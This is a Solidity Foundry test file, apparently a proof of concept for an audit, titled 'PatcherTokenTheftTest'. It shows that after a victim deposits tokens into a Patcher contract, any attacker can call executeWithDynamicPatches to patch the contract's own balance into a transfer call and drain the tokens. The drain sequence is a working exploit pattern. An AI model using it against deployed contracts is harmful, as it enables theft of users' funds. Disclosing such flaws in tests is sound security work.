// SPDX-License-Identifier: LGPL-3.0
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {Patcher} from "../../../src/Periphery/Patcher.sol";
import {TestToken as ERC20} from "../utils/TestToken.sol";

contract DummyValueSource {
    uint256 public value;
    function setValue(uint256 _value) external { value = _value; }
    function getValue() external view returns (uint256) { return value; }
}

contract DummyTarget {
    function processValue(uint256 /*_value*/ ) external {}
}

contract PatcherTokenTheftTest is Test {
    Patcher internal patcher;
    DummyValueSource internal valueSource;
    DummyTarget internal target;
    ERC20 internal token;
    address internal victim = address(0x1111);
    address internal attacker = address(0xBEEF);

    function setUp() public {
        patcher = new Patcher();
        valueSource = new DummyValueSource();
        target = new DummyTarget();
        token = new ERC20("Test Token", "TEST", 18);
        token.mint(victim, 1 ether);
    }

    function test_DepositTokensCanBeStolenByAnyone() public {
        uint256 amount = token.balanceOf(victim);

        bytes memory originalCalldata = abi.encodeWithSelector(
            target.processValue.selector,
            uint256(0)
        );
        uint256[] memory offsets = new uint256[](1);
        offsets[0] = 4;
        bytes memory valueGetter = abi.encodeWithSelector(
            valueSource.getValue.selector
        );

        vm.prank(victim);
        token.approve(address(patcher), amount);
        vm.prank(victim);
        patcher.depositAndExecuteWithDynamicPatches(
            address(token),
            address(valueSource),
            valueGetter,
            address(target),
            0,
            originalCalldata,
            offsets,
            false
        );
        assertEq(token.balanceOf(address(patcher)), amount);

        bytes memory drainData = abi.encodeWithSelector(
            token.transfer.selector,
            attacker,
            uint256(0)
        );
        uint256[] memory drainOffsets = new uint256[](1);
        drainOffsets[0] = 36;
        bytes memory balanceGetter = abi.encodeWithSelector(
            token.balanceOf.selector,
            address(patcher)
        );

        vm.prank(attacker);
        patcher.executeWithDynamicPatches(
            address(token),
            balanceGetter,
            address(token),
            0,
            drainData,
            drainOffsets,
            false
        );

        assertEq(token.balanceOf(attacker), amount);
    }
}
